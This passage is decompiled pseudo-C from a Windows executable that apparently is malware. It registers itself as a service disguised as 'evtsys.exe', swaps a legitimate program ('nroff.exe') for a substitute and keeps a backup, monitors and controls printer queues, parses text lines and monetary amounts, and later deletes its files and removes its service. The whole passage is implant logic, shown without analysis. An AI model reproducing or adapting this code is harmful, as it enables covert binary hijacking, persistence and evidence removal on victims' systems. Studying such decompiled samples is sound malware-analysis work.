    if ( EnumJobsA(phPrinter, 0, 0x3E8u, 1u, 0, 0, &pcbNeeded, (LPDWORD)&pPrinterName)
      || (v4 = GetLastError(), v5 = v4, v4 == 122) )
    {
      v6 = (char *)GlobalAlloc(0x40u, pcbNeeded);
      if ( v6 )
      {
        if ( EnumJobsA(phPrinter, 0, 0x3E8u, 1u, (LPBYTE)v6, pcbNeeded, &pcbNeeded, (LPDWORD)&pPrinterName) )
        {
          printf(aJobCountD, pPrinterName);
          if ( (unsigned int)pPrinterName > 0 )
          {
            v9 = (int)(v6 + 16);
            do
            {
              printf(asc_40FBEC);
              printf(aJobIdD, *(_DWORD *)(v9 - 16));
              printf(aUsernameS, *(_DWORD *)(v9 - 4));
              printf(aDocumentS, *(_DWORD *)v9);
              printf(aDatatypeS, *(_DWORD *)(v9 + 4));
              printf(aStatusD, *(_DWORD *)(v9 + 12));
              printf(aTotalpagesD, *(_DWORD *)(v9 + 24));
              printf(aPagesprintedD, *(_DWORD *)(v9 + 28));
              printf(aPriorityD, *(_DWORD *)(v9 + 16));
              printf(aPositionD, *(_DWORD *)(v9 + 20));
              printf(
                aSubmitted04d02,
                *(unsigned __int16 *)(v9 + 32),
                *(unsigned __int16 *)(v9 + 34),
                *(unsigned __int16 *)(v9 + 38),
                *(unsigned __int16 *)(v9 + 40),
                *(unsigned __int16 *)(v9 + 42),
                *(unsigned __int16 *)(v9 + 44));
              ++v1;
              v9 += 64;
            }
            while ( v1 < (unsigned int)pPrinterName );
          }
          GlobalFree(v6);
          ClosePrinter(phPrinter);
          result = 0;
        }
        else
        {
          v8 = GetLastError();
          printf(aFailedToEnumjo_0, v8);
          GlobalFree(v6);
          ClosePrinter(phPrinter);
          result = v8;
        }
      }
      else
      {
        v7 = GetLastError();
        ClosePrinter(phPrinter);
        result = v7;
      }
    }
    else
    {
      printf(aFailedToEnumjo, v4);
      ClosePrinter(phPrinter);
      result = v5;
    }
  }
  else
  {
    v2 = GetLastError();
    printf(aFailedToOpenPr, v2);
    result = v2;
  }
  return result;
}

//----- (004097E0) --------------------------------------------------------
DWORD __cdecl sub_4097E0(char *Dir, LPCSTR lpExistingFileName)
{
  DWORD v3; // esi
  char Path; // [esp+10h] [ebp-208h]
  char v5; // [esp+11h] [ebp-207h]
  __int16 v6; // [esp+111h] [ebp-107h]
  char v7; // [esp+113h] [ebp-105h]
  CHAR NewFileName; // [esp+114h] [ebp-104h]
  char v9; // [esp+115h] [ebp-103h]
  __int16 v10; // [esp+215h] [ebp-3h]
  char v11; // [esp+217h] [ebp-1h]

  Path = 0;
  NewFileName = 0;
  memset(&v5, 0, 0x100u);
  v6 = 0;
  v7 = 0;
  memset(&v9, 0, 0x100u);
  v10 = 0;
  v11 = 0;
  makepath(&Path, 0, Dir, aNroff, aExe);
  makepath(&NewFileName, 0, Dir, aRnoff, aExe);
  if ( !access(&NewFileName, 0) )
  {
    printf(aErrorRnoffAlre);
    return 0;
  }
  if ( MoveFileA(&Path, &NewFileName) )
  {
    if ( MoveFileA(lpExistingFileName, &Path) )
    {
      printf(aSuccess);
      return 0;
    }
    MoveFileA(&NewFileName, &Path);
    v3 = GetLastError();
    printf(aMoveSSFailedEr, lpExistingFileName, &Path, v3);
  }
  else
  {
    v3 = GetLastError();
    printf(aMoveSSFailedEr, &Path, &NewFileName, v3);
  }
  return v3;
}

//----- (00409920) --------------------------------------------------------
DWORD __cdecl sub_409920(char *Dir)
{
  DWORD v1; // ebx
  CHAR NewFileName; // [esp+10h] [ebp-30Ch]
  char v4; // [esp+11h] [ebp-30Bh]
  __int16 v5; // [esp+111h] [ebp-20Bh]
  char v6; // [esp+113h] [ebp-209h]
  char Path; // [esp+114h] [ebp-208h]
  char v8; // [esp+115h] [ebp-207h]
  __int16 v9; // [esp+215h] [ebp-107h]
  char v10; // [esp+217h] [ebp-105h]
  CHAR ExistingFileName; // [esp+218h] [ebp-104h]
  char v12; // [esp+219h] [ebp-103h]
  __int16 v13; // [esp+319h] [ebp-3h]
  char v14; // [esp+31Bh] [ebp-1h]

  v1 = 0;
  Path = 0;
  ExistingFileName = 0;
  memset(&v8, 0, 0x100u);
  v9 = 0;
  v10 = 0;
  NewFileName = 0;
  memset(&v12, 0, 0x100u);
  v13 = 0;
  v14 = 0;
  memset(&v4, 0, 0x100u);
  v5 = 0;
  v6 = 0;
  makepath(&Path, 0, Dir, aNroff, aExe);
  makepath(&ExistingFileName, 0, Dir, aRnoff, aExe);
  makepath(&NewFileName, 0, Dir, aNroff, aExe);
  strcat(&NewFileName, aBak);
  if ( access(&Path, 0) || access(&ExistingFileName, 0) )
  {
    printf(aErrorFileNotFo);
    return 1;
  }
  if ( !access(&NewFileName, 0) )
  {
    printf(aErrorBackupFil);
    return 1;
  }
  if ( MoveFileA(&Path, &NewFileName) )
  {
    if ( MoveFileA(&ExistingFileName, &Path) )
    {
      printf(aSuccess);
    }
    else
    {
      v1 = GetLastError();
      printf(aMoveSSFailedEr, &ExistingFileName, &Path, v1);
    }
  }
  else
  {
    v1 = GetLastError();
    printf(aMoveSSFailedEr, &Path, &NewFileName, v1);
  }
  sub_401640(&NewFileName);
  return v1;
}

//----- (00409AF0) --------------------------------------------------------
int __stdcall sub_409AF0(int a1)
{
  int result; // eax
  char v2; // bl
  int v3; // [esp+0h] [ebp-8h]
  int v4; // [esp+4h] [ebp-4h]

  sub_4010D0();
  InitializeCriticalSection(&CriticalSection);
  if ( sub_4013B0(FileName, (int)&unk_411060) )
  {
    sub_402E80(aSt0E, FileName);
    result = 0;
  }
  else
  {
    sub_402E80(aSt1);
    sub_408B50();
    sub_402E80(aSt2);
    makepath(byte_41949C, 0, byte_419290, aRnoff, aExe);
    while ( !sub_408E00((int)&unk_419068) )
      Sleep(0x1388u);
    byte_4195C8 = 1;
    if ( byte_4195C9 )
    {
      Sleep(0x3E8u);
      v4 = 0;
      v3 = 0;
      sub_4023B0(1, &v4, &v3, 0);
    }
    sub_402E80(aSt3);
    if ( szServerName )
      CreateThread(0, 0, StartAddress, 0, 0, 0);
    v2 = 0;
    if ( !dword_4195CC )
    {
      while ( 1 )
      {
        sub_4043E0();
        sub_4041B0();
        sub_408B50();
        sub_408390();
        if ( sub_409230() )
          break;
        Sleep(0x3E8u);
        if ( dword_4195CC )
          goto LABEL_15;
      }
      v2 = 1;
    }
LABEL_15:
    sub_402E80(aSt100);
    Sleep(0x2710u);
    dword_4195CC = 1;
    Sleep(0xBB8u);
    DeleteCriticalSection(&CriticalSection);
    if ( v2 )
    {
      sub_409920(byte_419290);
      sub_401870(Dir);
      sub_401640(FileName);
      sub_401640(Filename);
      sub_4092B0(ServiceName);
      sub_409300(0);
    }
    result = 0;
  }
  return result;
}
// 4195C8: using guessed type char byte_4195C8;
// 4195C9: using guessed type char byte_4195C9;
// 4195CC: using guessed type int dword_4195CC;

//----- (00409CB0) --------------------------------------------------------
BOOL __cdecl sub_409CB0(DWORD a1, DWORD a2, DWORD a3)
{
  BOOL result; // eax

  if ( !hServiceStatus )
    return 0;
  ServiceStatus.dwCurrentState = a1;
  ServiceStatus.dwControlsAccepted = a1 != 2;
  ServiceStatus.dwWin32ExitCode = a2;
  ServiceStatus.dwWaitHint = a3;
  if ( a1 == 4 || a1 == 1 )
  {
    ServiceStatus.dwCheckPoint = 0;
    result = SetServiceStatus(hServiceStatus, &ServiceStatus);
  }
  else
  {
    ++ServiceStatus.dwCheckPoint;
    result = SetServiceStatus(hServiceStatus, &ServiceStatus);
  }
  return result;
}

//----- (00409D30) --------------------------------------------------------
void __stdcall HandlerProc(DWORD dwControl)
{
  if ( dwControl == 1 )
  {
    sub_409CB0(3u, 0, 0);
    sub_409CB0(1u, 0, 0);
  }
}

//----- (00409D60) --------------------------------------------------------
int __stdcall sub_409D60(int a1, int a2)
{
  if ( a2 )
  {
    ServiceStatus.dwServiceType = 16;
    hServiceStatus = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);
    sub_409CB0(4u, 0, 0);
    byte_4195C9 = 1;
  }
  return sub_409AF0(0);
}
// 4195C9: using guessed type char byte_4195C9;

//----- (00409DB0) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebp
  const char **v4; // edi
  const char *v5; // ebx
  CHAR *v7; // ebp
  const char *v8; // edi
  const char **v9; // esi
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+10h] [ebp-10h]
  int v11; // [esp+18h] [ebp-8h]
  int v12; // [esp+1Ch] [ebp-4h]

  v3 = argc;
  v4 = argv;
  v5 = argv[1];
  if ( argc == 2 )
  {
    if ( !stricmp(v5, aSvc) )
    {
      ServiceStartTable.lpServiceName = aEvtsysExe;
      ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_409D60;
      v11 = 0;
      v12 = 0;
      byte_4195C9 = 1;
      if ( !StartServiceCtrlDispatcherA(&ServiceStartTable) )
        sub_409AF0(0);
      return 0;
    }
  }
  else if ( argc <= 1 )
  {
    return sub_409AF0(0);
  }
  if ( !stricmp(v5, aP) && v3 == 4 )
  {
    v7 = (CHAR *)v4[2];
    v8 = argv[3];
    if ( !stricmp(argv[3], aResume) )
      return sub_409530(v7);
    if ( !stricmp(v8, aPause) )
      _exit((int)v7);
    if ( !stricmp(v8, aOn) )
      return sub_409570(v7);
    if ( !stricmp(v8, aOff) )
      return sub_409590(v7);
    if ( !stricmp(v8, aQueue) )
      return sub_4095B0(v7);
    v3 = argc;
  }
  sub_4010D0();
  if ( sub_4013B0(FileName, (int)&unk_411060) )
  {
    printf(aCfgFailS, FileName);
    return 0;
  }
  printf(aCfgOkS, FileName);
  printf(aLogpathS, Filename);
  if ( !stricmp(v5, aS_2) && v3 == 3 )
    return sub_4097E0(byte_419290, argv[2]);
  if ( !stricmp(v5, aR) && v3 == 2 )
    return sub_409920(byte_419290);
  if ( !stricmp(v5, aG) && v3 == 3 )
  {
    v9 = argv;
    if ( sub_408EA0((int)argv[2]) )
      printf(aClosed);
    if ( sub_408E00((int)v9[2]) )
    {
      printf(aOpened);
      return 0;
    }
  }
  else
  {
    if ( !stricmp(v5, aT) && v3 == 3 )
    {
      sub_408F40((int)argv[2]);
      return 0;
    }
    if ( !stricmp(v5, aI) && v3 == 2 )
    {
      argv = 0;
      argc = 0;
      sub_4023B0(1, &argc, &argv, 1);
      printf(aPiDD, argc, argv);
      return 0;
    }
    if ( !stricmp(v5, aU) && v3 == 2 )
    {
      argv = 0;
      argc = 0;
      sub_4023B0(0, &argc, &argv, 1);
      printf(aPuDD, argc, argv);
    }
  }
  return 0;
}
// 4195C9: using guessed type char byte_4195C9;

//----- (0040A0E0) --------------------------------------------------------
int __thiscall sub_40A0E0(_DWORD *this)
{
  _DWORD *v1; // ebx
  _DWORD **v2; // ebp
  _DWORD *i; // edi
  _DWORD **v4; // esi
  int result; // eax

  v1 = this;
  v2 = (_DWORD **)this[1];
  for ( i = *v2; i != v2; --v1[2] )
  {
    v4 = (_DWORD **)i;
    i = (_DWORD *)*i;
    *v4[1] = *v4;
    (*v4)[1] = v4[1];
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(v4 + 2, 1);
    sub_40BC56(v4);
  }
  sub_40BC56((void *)v1[1]);
  result = 0;
  v1[1] = 0;
  v1[2] = 0;
  return result;
}
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);

//----- (0040A140) --------------------------------------------------------
_DWORD *__thiscall sub_40A140(_DWORD **this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = *this[1];
  return result;
}

//----- (0040A150) --------------------------------------------------------
_DWORD *__thiscall sub_40A150(_DWORD *this, _DWORD *a2, _DWORD *a3, char *a4)
{
  _DWORD *v4; // ebx
  _DWORD *v5; // ebp
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *result; // eax

  v4 = this;
  v5 = (_DWORD *)a3[1];
  v6 = operator new(0x18u);
  v7 = a3;
  if ( !a3 )
    v7 = v6;
  *v6 = v7;
  v8 = v5;
  if ( !v5 )
    v8 = v6;
  v6[1] = v8;
  a3[1] = v6;
  *(_DWORD *)v6[1] = v6;
  sub_40A2E0((int)(v6 + 2), a4);
  ++v4[2];
  result = a2;
  *a2 = v6;
  return result;
}

//----- (0040A1B0) --------------------------------------------------------
int __thiscall sub_40A1B0(_DWORD *this, int a2, void *Memory)
{
  _DWORD *v3; // edi
  int v4; // ebp
  int v5; // eax
  _BYTE *v6; // ecx
  char v7; // al
  int result; // eax

  v3 = this;
  v4 = *(_DWORD *)Memory;
  **((_DWORD **)Memory + 1) = *(_DWORD *)Memory;
  *(_DWORD *)(*(_DWORD *)Memory + 4) = *((_DWORD *)Memory + 1);
  v5 = *((_DWORD *)Memory + 3);
  if ( v5 )
  {
    v6 = (_BYTE *)(v5 - 1);
    v7 = *(_BYTE *)(v5 - 1);
    if ( v7 && v7 != -1 )
      *v6 = v7 - 1;
    else
      sub_40BC56(v6);
  }
  *((_DWORD *)Memory + 3) = 0;
  *((_DWORD *)Memory + 4) = 0;
  *((_DWORD *)Memory + 5) = 0;
  sub_40BC56(Memory);
  --v3[2];
  result = a2;
  *(_DWORD *)a2 = v4;
  return result;
}

//----- (0040A220) --------------------------------------------------------
int __thiscall sub_40A220(_DWORD *this, int a2, void *Memory, int a4)
{
  _DWORD *v4; // edi
  _DWORD *v5; // ebp
  _DWORD **v6; // esi
  _DWORD *v7; // eax
  _BYTE *v8; // ecx
  char v9; // al
  int result; // eax

  v4 = Memory;
  v5 = this;
  if ( Memory == (void *)a4 )
  {
    result = a2;
    *(_DWORD *)a2 = Memory;
  }
  else
  {
    do
    {
      v6 = (_DWORD **)v4;
      v4 = (_DWORD *)*v4;
      *v6[1] = *v6;
      (*v6)[1] = v6[1];
      v7 = v6[3];
      if ( v7 )
      {
        v8 = (char *)v7 - 1;
        v9 = *((_BYTE *)v7 - 1);
        if ( v9 && v9 != -1 )
          *v8 = v9 - 1;
        else
          sub_40BC56(v8);
      }
      v6[3] = 0;
      v6[4] = 0;
      v6[5] = 0;
      sub_40BC56(v6);
      --v5[2];
    }
    while ( v4 != (_DWORD *)a4 );
    result = a2;
    *(_DWORD *)a2 = v4;
  }
  return result;
}

//----- (0040A2B0) --------------------------------------------------------
_DWORD *__stdcall sub_40A2B0(_DWORD *a1, int a2)
{
  _DWORD *result; // eax
  _DWORD *v3; // ecx

  result = operator new(0x18u);
  v3 = a1;
  if ( !a1 )
    v3 = result;
  *result = v3;
  if ( a2 )
    result[1] = a2;
  else
    result[1] = result;
  return result;
}

//----- (0040A2E0) --------------------------------------------------------
void __cdecl sub_40A2E0(int a1, char *a2)
{
  char v2; // al
  unsigned int v3; // ebx
  unsigned int v4; // esi
  unsigned int v5; // eax
  int v6; // ebx
  int v7; // edx
  int v8; // eax
  int v9; // eax
  const void *v10; // esi
  int v11; // ecx

  if ( a1 )
  {
    v2 = *a2;
    *(_DWORD *)(a1 + 4) = 0;
    *(_BYTE *)a1 = v2;
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)(a1 + 12) = 0;
    v3 = *((_DWORD *)a2 + 2);
    if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos < v3 )
      v3 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
    if ( (char *)a1 == a2 )
    {
      v4 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
      if ( v3 > 0 )
        std::_Xran();
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Split(a1);
      v5 = *(_DWORD *)(a1 + 8) - v3;
      if ( v5 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
        v4 = *(_DWORD *)(a1 + 8) - v3;
      if ( v4 > 0 )
      {
        memmove((void *)(*(_DWORD *)(a1 + 4) + v3), (const void *)(*(_DWORD *)(a1 + 4) + v3 + v4), v5 - v4);
        v6 = *(_DWORD *)(a1 + 8) - v4;
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a1, v6, 0) )
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(a1, v7, v6);
      }
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Split(a1);
    }
    else
    {
      if ( v3 <= 0 || v3 != *((_DWORD *)a2 + 2) )
        goto LABEL_27;
      v8 = *((_DWORD *)a2 + 1);
      if ( !v8 )
        v8 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( *(_BYTE *)(v8 - 1) >= 0xFEu )
      {
LABEL_27:
        if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a1, v3, 1) )
        {
          v10 = (const void *)*((_DWORD *)a2 + 1);
          if ( !v10 )
            v10 = (const void *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          qmemcpy(*(void **)(a1 + 4), v10, v3);
          v11 = *(_DWORD *)(a1 + 4);
          *(_DWORD *)(a1 + 8) = v3;
          *(_BYTE *)(v11 + v3) = 0;
        }
      }
      else
      {
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(a1, 1);
        v9 = *((_DWORD *)a2 + 1);
        if ( !v9 )
          v9 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        *(_DWORD *)(a1 + 4) = v9;
        *(_DWORD *)(a1 + 8) = *((_DWORD *)a2 + 2);
        *(_DWORD *)(a1 + 12) = *((_DWORD *)a2 + 3);
        ++*(_BYTE *)(v9 - 1);
      }
    }
  }
}
// 40D100: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Split(_DWORD);
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D130: using guessed type int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);
// 40D138: using guessed type void __cdecl std::_Xran();

//----- (0040A4C0) --------------------------------------------------------
int __cdecl sub_40A4C0(const char *a1, void *a2, unsigned int a3)
{
  signed int i; // ebx

  memset(a2, 0, a3);
  for ( i = 0; i < (signed int)strlen(a1); ++i )
  {
    if ( i && !(i % 1000) && i != strlen(a1) - 1 )
      snprintf((char *)a2 + strlen((const char *)a2), a3 - (strlen((const char *)a2) + 1), asc_40FDD8);
    snprintf((char *)a2 + strlen((const char *)a2), a3 - (strlen((const char *)a2) + 1), a2x, a1[i]);
  }
  return 0;
}

//----- (0040A5A0) --------------------------------------------------------
unsigned int __cdecl sub_40A5A0(int a1, int a2, char *Dest, int a4)
{
  const char *v4; // ebx
  char *v6; // esi
  char SubStr; // [esp+10h] [ebp-Ch]
  char v8; // [esp+11h] [ebp-Bh]
  char v9; // [esp+12h] [ebp-Ah]
  int v10; // [esp+13h] [ebp-9h]
  __int16 v11; // [esp+17h] [ebp-5h]
  char v12; // [esp+19h] [ebp-3h]

  v10 = 0;
  v11 = 0;
  v12 = 0;
  memset(Dest, 0, a4);
  SubStr = 13;
  v8 = 10;
  v9 = 0;
  v4 = (const char *)(a1 + a2);
  if ( IsBadReadPtr((const void *)(a1 + a2), 1u) )
    return -1;
  v6 = strstr(v4, &SubStr);
  if ( !v6 )
  {
    strcpy(&SubStr, Source);
    v6 = strstr(v4, &SubStr);
    if ( !v6 )
    {
      strcpy(&SubStr, asc_40FDE0);
      v6 = strstr(v4, &SubStr);
      if ( !v6 )
        return -1;
    }
  }
  *v6 = 0;
  strncpy(Dest, v4, a4 - 1);
  *v6 = SubStr;
  return (unsigned int)&v6[strlen(&SubStr) - a1];
}

//----- (0040A6D0) --------------------------------------------------------
__int64 __cdecl sub_40A6D0(char *a1)
{
  char *v1; // esi
  char v2; // bl
  signed int v3; // edi
  char *v4; // ebp
  char v5; // al
  char v6; // al
  signed int v7; // ecx
  int v8; // edi
  __int64 result; // rax
  int v10; // esi
  __int64 v11; // [esp+10h] [ebp-28h]
  char Src; // [esp+18h] [ebp-20h]
  char v13; // [esp+19h] [ebp-1Fh]
  __int16 v14; // [esp+35h] [ebp-3h]
  char v15; // [esp+37h] [ebp-1h]

  Src = 0;
  memset(&v13, 0, 0x1Cu);
  v1 = a1;
  v2 = 0;
  v14 = 0;
  v15 = 0;
  v3 = 0;
  v4 = &Src;
  if ( *a1 )
  {
    do
    {
      v5 = *v1;
      if ( *v1 != 44 )
      {
        if ( v5 == 46 )
        {
          v2 = 1;
        }
        else
        {
          if ( !isdigit(v5) )
            break;
          if ( v2 )
            ++v3;
          if ( v3 > 2 )
            break;
          *v4++ = *v1;
        }
      }
      v6 = (v1++)[1];
    }
    while ( v6 );
  }
  v11 = 0i64;
  sscanf(&Src, aI64d, &v11);
  v7 = v3;
  v8 = v3 + 1;
  if ( v7 >= 2 )
    return v11;
  result = v11;
  v10 = 3 - v8;
  do
  {
    result *= 10i64;
    --v10;
  }
  while ( v10 );
  return result;
}

//----- (0040A7A0) --------------------------------------------------------
int __cdecl sub_40A7A0(int a1, int a2, char *Dest, int a4)
{
  unsigned int v4; // ebx
  int v5; // esi

  v4 = a2;
  v5 = a1;
  if ( a2 < 0 )
  {
    v5 = -a1;
    v4 = (unsigned __int64)-__PAIR__(a2, a1) >> 32;
  }
  memset(Dest, 0, a4);
  snprintf(Dest, a4 - 1, aI64dI64d, (signed __int64)__PAIR__(v4, v5) / 100, (signed __int64)__PAIR__(v4, v5) % 100);
  StrTrimA(Dest, a0);
  return 0;
}

//----- (0040A830) --------------------------------------------------------
int __cdecl sub_40A830(char *Str, char *SubStr, int a3, char *Dest, int a5)
{
  char *v5; // esi
  int v6; // ebx
  char *v7; // edx
  char *v8; // eax
  char *v9; // edi
  int result; // eax

  memset(Dest, 0, a5);
  v5 = Str;
  v6 = 0;
  if ( a3 <= 0 )
  {
LABEL_4:
    v8 = strstr(v5, SubStr);
    v9 = v8;
    if ( v8 )
      *v8 = 0;
    strncpy(Dest, v5, a5 - 1);
    if ( v9 )
      *v9 = *SubStr;
    result = 0;
  }
  else
  {
    while ( 1 )
    {
      v7 = strstr(v5, SubStr);
      if ( !v7 )
        break;
      v5 = &v7[strlen(SubStr)];
      if ( ++v6 >= a3 )
        goto LABEL_4;
    }
    result = -1;
  }
  return result;
}

//----- (0040A8D0) --------------------------------------------------------
int __cdecl sub_40A8D0(int a1, int a2, char *Str, char *Dest, int a5)
{
  int v5; // ecx
  signed int v6; // eax
  char *v8; // esi
  CHAR psz; // [esp+8h] [ebp-104h]
  char v10; // [esp+9h] [ebp-103h]
  __int16 v11; // [esp+109h] [ebp-3h]
  char v12; // [esp+10Bh] [ebp-1h]

  psz = 0;
  memset(&v10, 0, 0x100u);
  v11 = 0;
  v5 = *(_DWORD *)a2;
  v12 = 0;
  v6 = sub_40A5A0(a1, v5, &psz, 260);
  *(_DWORD *)a2 = v6;
  if ( v6 <= 0 )
    return -1;
  StrTrimA(&psz, asc_40FE04);
  v8 = strstr(Str, SubStr);
  if ( !v8 )
    return -1;
  *v8 = 0;
  snprintf(Dest, a5 - 1, aSS_2, Str, &psz);
  *v8 = 58;
  return 0;
}

//----- (0040A9A0) --------------------------------------------------------
signed int __cdecl sub_40A9A0(int a1, int *a2, int a3, const char *a4, int a5)
{
  int *v5; // edi
  signed int v6; // eax
  signed int v8; // eax
  signed int v9; // eax
  __int64 v10; // rax
  int v11; // [esp+4h] [ebp-720h]
  char Str; // [esp+8h] [ebp-71Ch]
  char v13; // [esp+9h] [ebp-71Bh]
  __int16 v14; // [esp+109h] [ebp-61Bh]
  char v15; // [esp+10Bh] [ebp-619h]
  CHAR v16; // [esp+10Ch] [ebp-618h]
  char v17; // [esp+10Dh] [ebp-617h]
  __int16 v18; // [esp+20Dh] [ebp-517h]
  char v19; // [esp+20Fh] [ebp-515h]
  CHAR psz; // [esp+210h] [ebp-514h]
  char v21; // [esp+211h] [ebp-513h]
  __int16 v22; // [esp+311h] [ebp-413h]
  char v23; // [esp+313h] [ebp-411h]
  char v24; // [esp+314h] [ebp-410h]
  char v25; // [esp+315h] [ebp-40Fh]
  __int16 v26; // [esp+415h] [ebp-30Fh]
  char v27; // [esp+417h] [ebp-30Dh]
  char Dest; // [esp+418h] [ebp-30Ch]
  char v29; // [esp+419h] [ebp-30Bh]
  __int16 v30; // [esp+519h] [ebp-20Bh]
  char v31; // [esp+51Bh] [ebp-209h]
  char v32; // [esp+51Ch] [ebp-208h]
  char v33; // [esp+51Dh] [ebp-207h]
  __int16 v34; // [esp+61Dh] [ebp-107h]
  char v35; // [esp+61Fh] [ebp-105h]
  char v36; // [esp+620h] [ebp-104h]
  char v37; // [esp+621h] [ebp-103h]
  __int16 v38; // [esp+721h] [ebp-3h]
  char v39; // [esp+723h] [ebp-1h]

  Str = 0;
  psz = 0;
  memset(&v13, 0, 0x100u);
  v14 = 0;
  v15 = 0;
  v36 = 0;
  memset(&v21, 0, 0x100u);
  v22 = 0;
  v23 = 0;
  v24 = 0;
  memset(&v37, 0, 0x100u);
  v38 = 0;
  v39 = 0;
  v32 = 0;
  memset(&v25, 0, 0x100u);
  v26 = 0;
  v27 = 0;
  v16 = 0;
  memset(&v33, 0, 0x100u);
  v34 = 0;
  v35 = 0;
  Dest = 0;
  memset(&v17, 0, 0x100u);
  v18 = 0;
  v19 = 0;
  memset(&v29, 0, 0x100u);
  v30 = 0;
  v31 = 0;
  v5 = a2;
  v6 = sub_40A5A0(a1, *a2, &Str, 260);
  *a2 = v6;
  if ( v6 <= 0 )
    return -1;
  while ( 1 )
  {
    v11 = *v5;
    v8 = sub_40A5A0(a1, *v5, &Str, 260);
    *v5 = v8;
    if ( v8 <= 0 )
      break;
    if ( strstr(&Str, SubStr) )
      break;
    v11 = *v5;
    v9 = sub_40A5A0(a1, *v5, &psz, 260);
    *v5 = v9;
    if ( v9 <= 0 || strstr(&psz, SubStr) )
      break;
    StrTrimA(&Str, asc_40FE04);
    StrTrimA(&psz, asc_40FE04);
    sub_40A830(&Str, asc_40FE04, 0, &v36, 260);
    snprintf(&Str, 0x103u, &Str + strlen(&v36));
    StrTrimA(&Str, asc_40FE04);
    sub_40A830(&Str, asc_40FE04, 0, &v24, 260);
    snprintf(&Str, 0x103u, &Str + strlen(&v24));
    StrTrimA(&Str, asc_40FE04);
    sub_40A830(&Str, asc_40FE04, 0, &v32, 260);
    snprintf(&Str, 0x103u, &Str + strlen(&v32));
    StrTrimA(&Str, asc_40FE04);
    sub_40A830(&Str, asc_40FE04, 0, &v16, 260);
    snprintf(&Dest, 0x103u, &Str + strlen(&v16));
    StrTrimA(&Dest, asc_40FE04);
    StrTrimA(&v16, asc_40FE24);
    v10 = sub_40A6D0(&v16);
    sub_40A7A0(v10, SHIDWORD(v10), &v16, 260);
    snprintf(&Str, 0x103u, a61SSSSS, &v36, &Dest, &v16, &v24, &v32);
    snprintf((char *)&a4[strlen(a4)], a5 - (strlen(a4) + 1), aSS_1, &Str, &psz);
    v5 = a2;
  }
  *v5 = v11;
  return 0;
}

//----- (0040AD70) --------------------------------------------------------
signed int __cdecl sub_40AD70(int a1, int *a2, char *Str, char *Dest, int a5)
{
  signed int v5; // ebp
  char *v6; // esi
  signed int v7; // eax
  __int64 v8; // rax
  unsigned int v9; // esi
  char *v10; // edi
  char *v11; // eax
  int v12; // eax
  char v14; // [esp+10h] [ebp-734h]
  int v15; // [esp+11h] [ebp-733h]
  int v16; // [esp+15h] [ebp-72Fh]
  char v17; // [esp+19h] [ebp-72Bh]
  char v18; // [esp+1Ch] [ebp-728h]
  int v19; // [esp+1Dh] [ebp-727h]
  int v20; // [esp+21h] [ebp-723h]
  char v21; // [esp+25h] [ebp-71Fh]
  char Str1; // [esp+28h] [ebp-71Ch]
  int v23; // [esp+29h] [ebp-71Bh]
  int v24; // [esp+2Dh] [ebp-717h]
  int v25; // [esp+31h] [ebp-713h]
  int v26; // [esp+35h] [ebp-70Fh]
  __int16 v27; // [esp+39h] [ebp-70Bh]
  char v28; // [esp+3Bh] [ebp-709h]
  char Str2[4]; // [esp+3Ch] [ebp-708h]
  int v30; // [esp+44h] [ebp-700h]
  int v31; // [esp+48h] [ebp-6FCh]
  int v32; // [esp+4Ch] [ebp-6F8h]
  int v33; // [esp+50h] [ebp-6F4h]
  int v34; // [esp+54h] [ebp-6F0h]
  char v35; // [esp+58h] [ebp-6ECh]
  int v36; // [esp+59h] [ebp-6EBh]
  int v37; // [esp+5Dh] [ebp-6E7h]
  __int16 v38; // [esp+61h] [ebp-6E3h]
  char v39; // [esp+63h] [ebp-6E1h]
  int v40; // [esp+64h] [ebp-6E0h]
  __int16 v41; // [esp+68h] [ebp-6DCh]
  int v42; // [esp+6Ah] [ebp-6DAh]
  int v43; // [esp+6Eh] [ebp-6D6h]
  int v44; // [esp+72h] [ebp-6D2h]
  __int16 v45; // [esp+76h] [ebp-6CEh]
  int v46; // [esp+78h] [ebp-6CCh]
  __int16 v47; // [esp+7Ch] [ebp-6C8h]
  int v48; // [esp+7Eh] [ebp-6C6h]
  int v49; // [esp+82h] [ebp-6C2h]
  int v50; // [esp+86h] [ebp-6BEh]
  __int16 v51; // [esp+8Ah] [ebp-6BAh]
  int v52; // [esp+8Ch] [ebp-6B8h]
  int v53; // [esp+90h] [ebp-6B4h]
  int v54; // [esp+94h] [ebp-6B0h]
  int v55; // [esp+98h] [ebp-6ACh]
  int v56; // [esp+9Ch] [ebp-6A8h]
  int v57; // [esp+A0h] [ebp-6A4h]
